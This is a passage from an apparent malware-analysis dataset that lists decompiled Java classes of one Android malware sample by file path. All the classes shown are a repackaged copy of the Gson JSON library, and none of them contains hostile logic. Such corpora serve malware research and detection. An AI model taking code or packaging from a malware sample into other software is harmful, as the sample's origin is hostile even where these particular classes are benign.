this;   }   @Override public V setValue(  V v){     V v2=this.value;     this.value=v;     return v2;   }   public String toString(){     return this.key + ""="" + this.value;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\ObjectConstructor.code","public interface ObjectConstructor<T> {   T construct(); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\packageinfo.code","interface packageinfo { } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\ParameterizedTypeImpl.code","public final class ParameterizedTypeImpl implements Serializable, ParameterizedType {   private static final long serialVersionUID=0;   private final Type ownerType;   private final Type rawType;   private final Type[] typeArguments;   public ParameterizedTypeImpl(  Type type,  Type type2,  Type... typeArr){     boolean z=true;     if (type2 instanceof Class) {       Class cls=(Class)type2;       C$Gson$Preconditions.checkArgument(type != null || cls.getEnclosingClass() == null);       if (type != null && cls.getEnclosingClass() == null) {         z=false;       }       C$Gson$Preconditions.checkArgument(z);     }     this.ownerType=type == null ? null : C$Gson$Types.canonicalize(type);     this.rawType=C$Gson$Types.canonicalize(type2);     this.typeArguments=(Type[])typeArr.clone();     for (int i=0; i < this.typeArguments.length; i++) {       C$Gson$Preconditions.checkNotNull(this.typeArguments[i]);       C$Gson$Types.checkNotPrimitive(this.typeArguments[i]);       this.typeArguments[i]=C$Gson$Types.canonicalize(this.typeArguments[i]);     }   }   public boolean equals(  Object obj){     return (obj instanceof ParameterizedType) && C$Gson$Types.equals(this,(ParameterizedType)obj);   }   @Override public Type[] getActualTypeArguments(){     return (Type[])this.typeArguments.clone();   }   @Override public Type getOwnerType(){     return this.ownerType;   }   @Override public Type getRawType(){     return this.rawType;   }   public int hashCode(){     return (Arrays.hashCode(this.typeArguments) ^ this.rawType.hashCode()) ^ C$Gson$Types.hashCodeOrZero(this.ownerType);   }   public String toString(){     StringBuilder sb=new StringBuilder((this.typeArguments.length + 1) * 30);     sb.append(C$Gson$Types.typeToString(this.rawType));     if (this.typeArguments.length == 0) {       return sb.toString();     }     sb.append(""<"").append(C$Gson$Types.typeToString(this.typeArguments[0]));     for (int i=1; i < this.typeArguments.length; i++) {       sb.append("", "").append(C$Gson$Types.typeToString(this.typeArguments[i]));     }     return sb.append("">"").toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\Primitives.code","public final class Primitives {   private static final Map<Class<?>,Class<?>> PRIMITIVE_TO_WRAPPER_TYPE;   private static final Map<Class<?>,Class<?>> WRAPPER_TO_PRIMITIVE_TYPE; static {     HashMap hashMap=new HashMap(16);     HashMap hashMap2=new HashMap(16);     add(hashMap,hashMap2,Boolean.TYPE,Boolean.class);     add(hashMap,hashMap2,Byte.TYPE,Byte.class);     add(hashMap,hashMap2,Character.TYPE,Character.class);     add(hashMap,hashMap2,Double.TYPE,Double.class);     add(hashMap,hashMap2,Float.TYPE,Float.class);     add(hashMap,hashMap2,Integer.TYPE,Integer.class);     add(hashMap,hashMap2,Long.TYPE,Long.class);     add(hashMap,hashMap2,Short.TYPE,Short.class);     add(hashMap,hashMap2,Void.TYPE,Void.class);     PRIMITIVE_TO_WRAPPER_TYPE=Collections.unmodifiableMap(hashMap);     WRAPPER_TO_PRIMITIVE_TYPE=Collections.unmodifiableMap(hashMap2);   }   private Primitives(){   }   private static void add(  Map<Class<?>,Class<?>> map,  Map<Class<?>,Class<?>> map2,  Class<?> cls,  Class<?> cls2){     map.put(cls,cls2);     map2.put(cls2,cls);   }   public static boolean isPrimitive(  Type type){     return PRIMITIVE_TO_WRAPPER_TYPE.containsKey(type);   }   public static boolean isWrapperType(  Type type){     return WRAPPER_TO_PRIMITIVE_TYPE.containsKey(C$Gson$Preconditions.checkNotNull(type));   }   public static <T>Class<T> unwrap(  Class<T> cls){     Class<T> cls2=(Class)WRAPPER_TO_PRIMITIVE_TYPE.get(C$Gson$Preconditions.checkNotNull(cls));     return cls2 == null ? cls : cls2;   }   public static <T>Class<T> wrap(  Class<T> cls){     Class<T> cls2=(Class)PRIMITIVE_TO_WRAPPER_TYPE.get(C$Gson$Preconditions.checkNotNull(cls));     return cls2 == null ? cls : cls2;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\Streams.code","public final class Streams { final class AppendableWriter extends Writer {     private final Appendable appendable;     private final CurrentWrite currentWrite; class CurrentWrite implements CharSequence {       char[] chars;       CurrentWrite(){       }       @Override public char charAt(      int i){         return this.chars[i];       }       @Override public int length(){         return this.chars.length;       }       @Override public CharSequence subSequence(      int i,      int i2){         return new String(this.chars,i,i2 - i);       }     }     private AppendableWriter(    Appendable appendable){       this.currentWrite=new CurrentWrite();       this.appendable=appendable;     }     @Override public void close(){     }     @Override public void flush(){     }     @Override public void write(    int i){       this.appendable.append((char)i);     }     @Override public void write(    char[] cArr,    int i,    int i2){       this.currentWrite.chars=cArr;       this.appendable.append(this.currentWrite,i,i + i2);     }   }   public static JsonElement parse(  JsonReader jsonReader){     boolean z=true;     try {       jsonReader.peek();       z=false;       return TypeAdapters.JSON_ELEMENT.read(jsonReader);     }  catch (    MalformedJsonException e) {       throw new JsonSyntaxException(e);     } catch (    EOFException e2) {       if (z) {         return JsonNull.INSTANCE;       }       throw new JsonSyntaxException(e2);     } catch (    IOException e3) {       throw new JsonIOException(e3);     } catch (    NumberFormatException e4) {       throw new JsonSyntaxException(e4);     }   }   public static void write(  JsonElement jsonElement,  JsonWriter jsonWriter){     TypeAdapters.JSON_ELEMENT.write(jsonWriter,jsonElement);   }   public static Writer writerForAppendable(  Appendable appendable){     return appendable instanceof Writer ? (Writer)appendable : new AppendableWriter(appendable);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\UnsafeAllocator.code","public abstract class UnsafeAllocator {   public static UnsafeAllocator create(){     try {       Class<?> cls=Class.forName(""sun.misc.Unsafe"");       Field declaredField=cls.getDeclaredField(""theUnsafe"");       declaredField.setAccessible(true);       final Object obj=declaredField.get(null);       final Method method=cls.getMethod(""allocateInstance"",Class.class);       return new UnsafeAllocator(){         @Override public <T>T newInstance(        Class<T> cls2){           return (T)method.invoke(obj,cls2);         }       } ;     }  catch (    Exception e) {       try {         final Method declaredMethod=ObjectInputStream.class.getDeclaredMethod(""newInstance"",Class.class,Class.class);         declaredMethod.setAccessible(true);         return new UnsafeAllocator(){           @Override public <T>T newInstance(          Class<T> cls2){             return (T)declaredMethod.invoke(null,cls2,Object.class);           }         } ;       }  catch (      Exception e2) {         try {           Method declaredMethod2=ObjectStreamClass.class.getDeclaredMethod(""getConstructorId"",Class.class);           declaredMethod2.setAccessible(true);           final int intValue=((Integer)declaredMethod2.invoke(null,Object.class)).intValue();           final Method declaredMethod3=ObjectStreamClass.class.getDeclaredMethod(""newInstance"",Class.class,Integer.TYPE);           declaredMethod3.setAccessible(true);           return new UnsafeAllocator(){             @Override public <T>T newInstance(            Class<T> cls2){               return (T)declaredMethod3.invoke(null,cls2,Integer.valueOf(intValue));             }           } ;         }  catch (        Exception e3) {           return new UnsafeAllocator(){             @Override public <T>T newInstance(            Class<T> cls2){               throw new UnsupportedOperationException(""Cannot allocate "" + cls2);             }           } ;         }       }     }   }   public abstract <T>T newInstance(  Class<T> cls); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal\WildcardTypeImpl.code","public final class WildcardTypeImpl implements Serializable, WildcardType {   private static final long serialVersionUID=0;   private final Type lowerBound;   private final Type upperBound;   public WildcardTypeImpl(  Type[] typeArr,  Type[] typeArr2){     C$Gson$Preconditions.checkArgument(typeArr2.length <= 1);     C$Gson$Preconditions.checkArgument(typeArr.length == 1);     if (typeArr2.length != 1) {       C$Gson$Preconditions.checkNotNull(typeArr[0]);       C$Gson$Types.checkNotPrimitive(typeArr[0]);       this.lowerBound=null;       this.upperBound=C$Gson$Types.canonicalize(typeArr[0]);       return;     }     C$Gson$Preconditions.checkNotNull(typeArr2[0]);     C$Gson$Types.checkNotPrimitive(typeArr2[0]);     C$Gson$Preconditions.checkArgument(typeArr[0] == Object.class);     this.lowerBound=C$Gson$Types.canonicalize(typeArr2[0]);     this.upperBound=Object.class;   }   public boolean equals(  Object obj){     return (obj instanceof WildcardType) && C$Gson$Types.equals(this,(WildcardType)obj);   }   @Override public Type[] getLowerBounds(){     return this.lowerBound != null ? new Type[]{this.lowerBound} : C$Gson$Types.EMPTY_TYPE_ARRAY;   }   @Override public Type[] getUpperBounds(){     return new Type[]{this.upperBound};   }   public int hashCode(){     return (this.lowerBound != null ? this.lowerBound.hashCode() + 31 : 1) ^ (this.upperBound.hashCode() + 31);   }   public String toString(){     return this.lowerBound != null ? ""? super "" + C$Gson$Types.typeToString(this.lowerBound) : this.upperBound == Object.class ? ""?"" : ""? extends "" + C$Gson$Types.typeToString(this.upperBound);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\Adapter.code","final class Adapter<E> extends TypeAdapter<Collection<E>> {   private final ObjectConstructor<? extends Collection<E>> constructor;   private final TypeAdapter<E> elementTypeAdapter;   public Adapter(  Gson gson,  Type type,  TypeAdapter<E> typeAdapter,  ObjectConstructor<? extends Collection<E>> objectConstructor){     this.elementTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter,type);     this.constructor=objectConstructor;   }   @Override public Collection<E> read(  JsonReader jsonReader){     if (jsonReader.peek() == JsonToken.NULL) {       jsonReader.nextNull();       return null;     }     Collection<E> construct=this.constructor.construct();     jsonReader.beginArray();     while (jsonReader.hasNext()) {       construct.add(this.elementTypeAdapter.read(jsonReader));     }     jsonReader.endArray();     return construct;   }   @Override public void write(  JsonWriter jsonWriter,  Collection<E> collection){     if (collection == null) {       jsonWriter.nullValue();       return;     }     jsonWriter.beginArray();     Iterator<E> it=collection.iterator();     while (it.hasNext()) {       this.elementTypeAdapter.write(jsonWriter,it.next());     }     jsonWriter.endArray();   } } final class Adapter<K,V> extends TypeAdapter<Map<K,V>> {   private final ObjectConstructor<? extends Map<K,V>> constructor;   private final TypeAdapter<K> keyTypeAdapter;   private final TypeAdapter<V> valueTypeAdapter;   public Adapter(  Gson gson,  Type type,  TypeAdapter<K> typeAdapter,  Type type2,  TypeAdapter<V> typeAdapter2,  ObjectConstructor<? extends Map<K,V>> objectConstructor){     this.keyTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter,type);     this.valueTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter2,type2);     this.constructor=objectConstructor;   }   private String keyToString(  JsonElement jsonElement){     if (!jsonElement.isJsonPrimitive()) {       if (jsonElement.isJsonNull()) {         return ""null"";       }       throw new AssertionError();     }     JsonPrimitive asJsonPrimitive=jsonElement.getAsJsonPrimitive();     if (asJsonPrimitive.isNumber()) {       return String.valueOf(asJsonPrimitive.getAsNumber());     }     if (asJsonPrimitive.isBoolean()) {       return Boolean.toString(asJsonPrimitive.getAsBoolean());     }     if (asJsonPrimitive.isString()) {       return asJsonPrimitive.getAsString();     }     throw new AssertionError();   }   @Override public Map<K,V> read(  JsonReader jsonReader){     JsonToken peek=jsonReader.peek();     if (peek == JsonToken.NULL) {       jsonReader.nextNull();       return null;     }     Map<K,V> construct=this.constructor.construct();     if (peek != JsonToken.BEGIN_ARRAY) {       jsonReader.beginObject();       while (jsonReader.hasNext()) {         JsonReaderInternalAccess.INSTANCE.promoteNameToValue(jsonReader);         K read=this.keyTypeAdapter.read(jsonReader);         if (construct.put(read,this.valueTypeAdapter.read(jsonReader)) != null) {           throw new JsonSyntaxException(""duplicate key: "" + read);         }       }       jsonReader.endObject();       return construct;     }     jsonReader.beginArray();     while (jsonReader.hasNext()) {       jsonReader.beginArray();       K read2=this.keyTypeAdapter.read(jsonReader);       if (construct.put(read2,this.valueTypeAdapter.read(jsonReader)) != null) {         throw new JsonSyntaxException(""duplicate key: "" + read2);       }       jsonReader.endArray();     }     jsonReader.endArray();     return construct;   }   @Override public void write(  JsonWriter jsonWriter,  Map<K,V> map){     int i=0;     if (map == null) {       jsonWriter.nullValue();       return;     }     if (!MapTypeAdapterFactory.this.complexMapKeySerialization) {       jsonWriter.beginObject();       for (      Map.Entry<K,V> entry : map.entrySet()) {         jsonWriter.name(String.valueOf(entry.getKey()));         this.valueTypeAdapter.write(jsonWriter,entry.getValue());       }       jsonWriter.endObject();       return;     }     ArrayList arrayList=new ArrayList(map.size());     ArrayList arrayList2=new ArrayList(map.size());     boolean z=false;     for (    Map.Entry<K,V> entry2 : map.entrySet()) {       JsonElement jsonTree=this.keyTypeAdapter.toJsonTree(entry2.getKey());       arrayList.add(jsonTree);       arrayList2.add(entry2.getValue());       z=(jsonTree.isJsonArray() || jsonTree.isJsonObject()) | z;     }     if (!z) {       jsonWriter.beginObject();       while (i < arrayList.size()) {         jsonWriter.name(keyToString((JsonElement)arrayList.get(i)));         this.valueTypeAdapter.write(jsonWriter,arrayList2.get(i));         i++;       }       jsonWriter.endObject();       return;     }     jsonWriter.beginArray();     while (i < arrayList.size()) {       jsonWriter.beginArray();       Streams.write((JsonElement)arrayList.get(i),jsonWriter);       this.valueTypeAdapter.write(jsonWriter,arrayList2.get(i));       jsonWriter.endArray();       i++;     }     jsonWriter.endArray();   } } public final class Adapter<T> extends TypeAdapter<T> {   private final Map<String,BoundField> boundFields;   private final ObjectConstructor<T> constructor;   private Adapter(  ObjectConstructor<T> objectConstructor,  Map<String,BoundField> map){     this.constructor=objectConstructor;     this.boundFields=map;   }   @Override public T read(  JsonReader jsonReader){     if (jsonReader.peek() == JsonToken.NULL) {       jsonReader.nextNull();       return null;     }     T construct=this.constructor.construct();     try {       jsonReader.beginObject();       while (jsonReader.hasNext()) {         BoundField boundField=this.boundFields.get(jsonReader.nextName());         if (boundField == null || !boundField.deserialized) {           jsonReader.skipValue();         }  else {           boundField.read(jsonReader,construct);         }       }       jsonReader.endObject();       return construct;     }  catch (    IllegalAccessException e) {       throw new AssertionError(e);     } catch (    IllegalStateException e2) {       throw new JsonSyntaxException(e2);     }   }   @Override public void write(  JsonWriter jsonWriter,  T t){     if (t == null) {       jsonWriter.nullValue();       return;     }     jsonWriter.beginObject();     try {       for (      BoundField boundField : this.boundFields.values()) {         if (boundField.serialized) {           jsonWriter.name(boundField.name);           boundField.write(jsonWriter,t);         }       }       jsonWriter.endObject();     }  catch (    IllegalAccessException e) {       throw new AssertionError();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\AnonymousClass32.code","public class AnonymousClass32 {   static final int[] $SwitchMap$com$bayimob$support$com$google$gson$stream$JsonToken=new int[JsonToken.values().length]; static {     try {       $SwitchMap$com$bayimob$support$com$google$gson$stream$JsonToken[JsonToken.NUMBER.ordinal()]=1;     }  catch (    NoSuchFieldError e) {     }     try {       $SwitchMap$com$bayimob$support$com$google$gson$stream$JsonToken[JsonToken.BOOLEAN.ordinal()]=2;     }  catch (    NoSuchFieldError e2) {     }     try {       $SwitchMap$com$bayimob$support$com$google$gson$stream$JsonToken[JsonToken.STRING.ordinal()]=3;     }  catch (    NoSuchFieldError e3) {     }     try {       $SwitchMap$com$bayimob$support$com$google$gson$stream$JsonToken[JsonToken.NULL.ordinal()]=4;     }  catch (    NoSuchFieldError e4) {     }     try {       $SwitchMap$com$bayimob$support$com$google$gson$stream$JsonToken[JsonToken.BEGIN_ARRAY.ordinal()]=5;     }  catch (    NoSuchFieldError e5) {     }     try {       $SwitchMap$com$bayimob$support$com$google$gson$stream$JsonToken[JsonToken.BEGIN_OBJECT.ordinal()]=6;     }  catch (    NoSuchFieldError e6) {     }     try {       $SwitchMap$com$bayimob$support$com$google$gson$stream$JsonToken[JsonToken.END_DOCUMENT.ordinal()]=7;     }  catch (    NoSuchFieldError e7) {     }     try {       $SwitchMap$com$bayimob$support$com$google$gson$stream$JsonToken[JsonToken.NAME.ordinal()]=8;     }  catch (    NoSuchFieldError e8) {     }     try {       $SwitchMap$com$bayimob$support$com$google$gson$stream$JsonToken[JsonToken.END_OBJECT.ordinal()]=9;     }  catch (    NoSuchFieldError e9) {     }     try {       $SwitchMap$com$bayimob$support$com$google$gson$stream$JsonToken[JsonToken.END_ARRAY.ordinal()]=10;     }  catch (    NoSuchFieldError e10) {     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\ArrayTypeAdapter.code","public final class ArrayTypeAdapter<E> extends TypeAdapter<Object> {   public static final TypeAdapterFactory FACTORY=new TypeAdapterFactory(){     @Override public <T>TypeAdapter<T> create(    Gson gson,    TypeToken<T> typeToken){       Type type=typeToken.getType();       if (!(type instanceof GenericArrayType) && (!(type instanceof Class) || !((Class)type).isArray())) {         return null;       }       Type arrayComponentType=C$Gson$Types.getArrayComponentType(type);       return new ArrayTypeAdapter(gson,gson.getAdapter(TypeToken.get(arrayComponentType)),C$Gson$Types.getRawType(arrayComponentType));     }   } ;   private final Class<E> componentType;   private final TypeAdapter<E> componentTypeAdapter;   public ArrayTypeAdapter(  Gson gson,  TypeAdapter<E> typeAdapter,  Class<E> cls){     this.componentTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter,cls);     this.componentType=cls;   }   @Override public Object read(  JsonReader jsonReader){     if (jsonReader.peek() == JsonToken.NULL) {       jsonReader.nextNull();       return null;     }     ArrayList arrayList=new ArrayList();     jsonReader.beginArray();     while (jsonReader.hasNext()) {       arrayList.add(this.componentTypeAdapter.read(jsonReader));     }     jsonReader.endArray();     Object newInstance=Array.newInstance((Class<?>)this.componentType,arrayList.size());     for (int i=0; i < arrayList.size(); i++) {       Array.set(newInstance,i,arrayList.get(i));     }     return newInstance;   }   @Override public void write(  JsonWriter jsonWriter,  Object obj){     if (obj == null) {       jsonWriter.nullValue();       return;     }     jsonWriter.beginArray();     int length=Array.getLength(obj);     for (int i=0; i < length; i++) {       this.componentTypeAdapter.write(jsonWriter,Array.get(obj,i));     }     jsonWriter.endArray();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\BoundField.code","public abstract class BoundField {   final boolean deserialized;   final String name;   final boolean serialized;   protected BoundField(  String str,  boolean z,  boolean z2){     this.name=str;     this.serialized=z;     this.deserialized=z2;   }   abstract void read(  JsonReader jsonReader,  Object obj);   abstract void write(  JsonWriter jsonWriter,  Object obj); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\CollectionTypeAdapterFactory.code","public final class CollectionTypeAdapterFactory implements TypeAdapterFactory {   private final ConstructorConstructor constructorConstructor; final class Adapter<E> extends TypeAdapter<Collection<E>> {     private final ObjectConstructor<? extends Collection<E>> constructor;     private final TypeAdapter<E> elementTypeAdapter;     public Adapter(    Gson gson,    Type type,    TypeAdapter<E> typeAdapter,    ObjectConstructor<? extends Collection<E>> objectConstructor){       this.elementTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter,type);       this.constructor=objectConstructor;     }     @Override public Collection<E> read(    JsonReader jsonReader){       if (jsonReader.peek() == JsonToken.NULL) {         jsonReader.nextNull();         return null;       }       Collection<E> construct=this.constructor.construct();       jsonReader.beginArray();       while (jsonReader.hasNext()) {         construct.add(this.elementTypeAdapter.read(jsonReader));       }       jsonReader.endArray();       return construct;     }     @Override public void write(    JsonWriter jsonWriter,    Collection<E> collection){       if (collection == null) {         jsonWriter.nullValue();         return;       }       jsonWriter.beginArray();       Iterator<E> it=collection.iterator();       while (it.hasNext()) {         this.elementTypeAdapter.write(jsonWriter,it.next());       }       jsonWriter.endArray();     }   }   public CollectionTypeAdapterFactory(  ConstructorConstructor constructorConstructor){     this.constructorConstructor=constructorConstructor;   }   @Override public <T>TypeAdapter<T> create(  Gson gson,  TypeToken<T> typeToken){     Type type=typeToken.getType();     Class<? super T> rawType=typeToken.getRawType();     if (!Collection.class.isAssignableFrom(rawType)) {       return null;     }     Type collectionElementType=C$Gson$Types.getCollectionElementType(type,rawType);     return new Adapter(gson,collectionElementType,gson.getAdapter(TypeToken.get(collectionElementType)),this.constructorConstructor.get(typeToken));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\DateTypeAdapter.code","public final class DateTypeAdapter extends TypeAdapter<Date> {   public static final TypeAdapterFactory FACTORY=new TypeAdapterFactory(){     @Override public <T>TypeAdapter<T> create(    Gson gson,    TypeToken<T> typeToken){       if (typeToken.getRawType() == Date.class) {         return new DateTypeAdapter();       }       return null;     }   } ;   private final DateFormat enUsFormat=DateFormat.getDateTimeInstance(2,2,Locale.US);   private final DateFormat localFormat=DateFormat.getDateTimeInstance(2,2);   private final DateFormat iso8601Format=buildIso8601Format();   private static DateFormat buildIso8601Format(){     SimpleDateFormat simpleDateFormat=new SimpleDateFormat(""yyyy-MM-dd'T'HH:mm:ss'Z'"",Locale.US);     simpleDateFormat.setTimeZone(TimeZone.getTimeZone(""UTC""));     return simpleDateFormat;   }   private synchronized Date deserializeToDate(  String str){     Date parse;     try {       parse=this.localFormat.parse(str);     }  catch (    ParseException e) {       try {         parse=this.enUsFormat.parse(str);       }  catch (      ParseException e2) {         try {           parse=this.iso8601Format.parse(str);         }  catch (        ParseException e3) {           throw new JsonSyntaxException(str,e3);         }       }     }     return parse;   }   @Override public Date read(  JsonReader jsonReader){     if (jsonReader.peek() != JsonToken.NULL) {       return deserializeToDate(jsonReader.nextString());     }     jsonReader.nextNull();     return null;   }   @Override public synchronized void write(  JsonWriter jsonWriter,  Date date){     if (date == null) {       jsonWriter.nullValue();     }  else {       jsonWriter.value(this.enUsFormat.format(date));     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\EnumTypeAdapter.code","final class EnumTypeAdapter<T extends Enum<T>> extends TypeAdapter<T> {   private final Map<String,T> nameToConstant=new HashMap();   private final Map<T,String> constantToName=new HashMap();   public EnumTypeAdapter(  Class<T> cls){     try {       for (      T t : cls.getEnumConstants()) {         String name=t.name();         SerializedName serializedName=(SerializedName)cls.getField(name).getAnnotation(SerializedName.class);         String value=serializedName != null ? serializedName.value() : name;         this.nameToConstant.put(value,t);         this.constantToName.put(t,value);       }     }  catch (    NoSuchFieldException e) {       throw new AssertionError();     }   }   @Override public T read(  JsonReader jsonReader){     if (jsonReader.peek() != JsonToken.NULL) {       return this.nameToConstant.get(jsonReader.nextString());     }     jsonReader.nextNull();     return null;   }   @Override public void write(  JsonWriter jsonWriter,  T t){     jsonWriter.value(t == null ? null : this.constantToName.get(t));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\JsonTreeReader.code","public final class JsonTreeReader extends JsonReader {   private final List<Object> stack;   private static final Reader UNREADABLE_READER=new Reader(){     @Override public void close(){       throw new AssertionError();     }     @Override public int read(    char[] cArr,    int i,    int i2){       throw new AssertionError();     }   } ;   private static final Object SENTINEL_CLOSED=new Object();   public JsonTreeReader(  JsonElement jsonElement){     super(UNREADABLE_READER);     this.stack=new ArrayList();     this.stack.add(jsonElement);   }   private void expect(  JsonToken jsonToken){     if (peek() != jsonToken) {       throw new IllegalStateException(""Expected "" + jsonToken + "" but was ""+ peek());     }   }   private Object peekStack(){     return this.stack.get(this.stack.size() - 1);   }   private Object popStack(){     return this.stack.remove(this.stack.size() - 1);   }   @Override public void beginArray(){     expect(JsonToken.BEGIN_ARRAY);     this.stack.add(((JsonArray)peekStack()).iterator());   }   @Override public void beginObject(){     expect(JsonToken.BEGIN_OBJECT);     this.stack.add(((JsonObject)peekStack()).entrySet().iterator());   }   @Override public void close(){     this.stack.clear();     this.stack.add(SENTINEL_CLOSED);   }   @Override public void endArray(){     expect(JsonToken.END_ARRAY);     popStack();     popStack();   }   @Override public void endObject(){     expect(JsonToken.END_OBJECT);     popStack();     popStack();   }   @Override public boolean hasNext(){     JsonToken peek=peek();     return (peek == JsonToken.END_OBJECT || peek == JsonToken.END_ARRAY) ? false : true;   }   @Override public boolean nextBoolean(){     expect(JsonToken.BOOLEAN);     return ((JsonPrimitive)popStack()).getAsBoolean();   }   @Override public double nextDouble(){     JsonToken peek=peek();     if (peek != JsonToken.NUMBER && peek != JsonToken.STRING) {       throw new IllegalStateException(""Expected "" + JsonToken.NUMBER + "" but was ""+ peek);     }     double asDouble=((JsonPrimitive)peekStack()).getAsDouble();     if (!isLenient() && (Double.isNaN(asDouble) || Double.isInfinite(asDouble))) {       throw new NumberFormatException(""JSON forbids NaN and infinities: "" + asDouble);     }     popStack();     return asDouble;   }   @Override public int nextInt(){     JsonToken peek=peek();     if (peek != JsonToken.NUMBER && peek != JsonToken.STRING) {       throw new IllegalStateException(""Expected "" + JsonToken.NUMBER + "" but was ""+ peek);     }     int asInt=((JsonPrimitive)peekStack()).getAsInt();     popStack();     return asInt;   }   @Override public long nextLong(){     JsonToken peek=peek();     if (peek != JsonToken.NUMBER && peek != JsonToken.STRING) {       throw new IllegalStateException(""Expected "" + JsonToken.NUMBER + "" but was ""+ peek);     }     long asLong=((JsonPrimitive)peekStack()).getAsLong();     popStack();     return asLong;   }   @Override public String nextName(){     expect(JsonToken.NAME);     Map.Entry entry=(Map.Entry)((Iterator)peekStack()).next();     this.stack.add(entry.getValue());     return (String)entry.getKey();   }   @Override public void nextNull(){     expect(JsonToken.NULL);     popStack();   }   @Override public String nextString(){     JsonToken peek=peek();     if (peek == JsonToken.STRING || peek == JsonToken.NUMBER) {       return ((JsonPrimitive)popStack()).getAsString();     }     throw new IllegalStateException(""Expected "" + JsonToken.STRING + "" but was ""+ peek);   }   @Override public JsonToken peek(){     if (this.stack.isEmpty()) {       return JsonToken.END_DOCUMENT;     }     Object peekStack=peekStack();     if (peekStack instanceof Iterator) {       boolean z=this.stack.get(this.stack.size() - 2) instanceof JsonObject;       Iterator it=(Iterator)peekStack;       if (!it.hasNext()) {         return z ? JsonToken.END_OBJECT : JsonToken.END_ARRAY;       }       if (z) {         return JsonToken.NAME;       }       this.stack.add(it.next());       return peek();     }     if (peekStack instanceof JsonObject) {       return JsonToken.BEGIN_OBJECT;     }     if (peekStack instanceof JsonArray) {       return JsonToken.BEGIN_ARRAY;     }     if (!(peekStack instanceof JsonPrimitive)) {       if (peekStack instanceof JsonNull) {         return JsonToken.NULL;       }       if (peekStack == SENTINEL_CLOSED) {         throw new IllegalStateException(""JsonReader is closed"");       }       throw new AssertionError();     }     JsonPrimitive jsonPrimitive=(JsonPrimitive)peekStack;     if (jsonPrimitive.isString()) {       return JsonToken.STRING;     }     if (jsonPrimitive.isBoolean()) {       return JsonToken.BOOLEAN;     }     if (jsonPrimitive.isNumber()) {       return JsonToken.NUMBER;     }     throw new AssertionError();   }   public void promoteNameToValue(){     expect(JsonToken.NAME);     Map.Entry entry=(Map.Entry)((Iterator)peekStack()).next();     this.stack.add(entry.getValue());     this.stack.add(new JsonPrimitive((String)entry.getKey()));   }   @Override public void skipValue(){     if (peek() == JsonToken.NAME) {       nextName();     }  else {       popStack();     }   }   @Override public String toString(){     return getClass().getSimpleName();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson.internal.bind\JsonTreeWriter.code","public final class JsonTreeWriter extends JsonWriter {   private String pendingName;   private JsonElement product;   private final List<JsonElement> stack;   private static final Writer UNWRITABLE_WRITER=new Writer(){     @Override public void close(){       throw new AssertionError();     }     @Override public void flush(){       throw new AssertionError();     }     @Override public void write(    char[] cArr,    int i,    int i2){       throw new AssertionError();     }   } ;   private static final JsonPrimitive SENTINEL_CLOSED=new JsonPrimitive(""closed"");   public JsonTreeWriter(){     super(UNWRITABLE_WRITER);     this.stack=new ArrayList();     this.product=JsonNull.INSTANCE;   }   private JsonElement peek(){     return this.stack.get(this.stack.size() - 1);   }   private void put(  JsonElement jsonElement){     if (this.pendingName != null) {       if (!jsonElement.isJsonNull() || getSerializeNulls()) {         ((JsonObject)peek()).add(this.pendingName,jsonElement);       }       this.pendingName=null;       return;     }     if (this.stack.isEmpty()) {       this.product=jsonElement;       return;     }     JsonElement peek=peek();     if (!(peek instanceof JsonArray)) {       throw new IllegalStateException();     }     ((JsonArray)peek).add(jsonElement);   }   @Override public JsonWriter beginArray(){     JsonArray jsonArray=new JsonArray();     put(jsonArray);     this.stack.add(jsonArray);     return this;   }   @Override public JsonWriter beginObject(){     JsonObject jsonObject=new JsonObject();     put(jsonObject);     this.stack.add(jsonObject);     return this;   }   @Override public void close(){     if 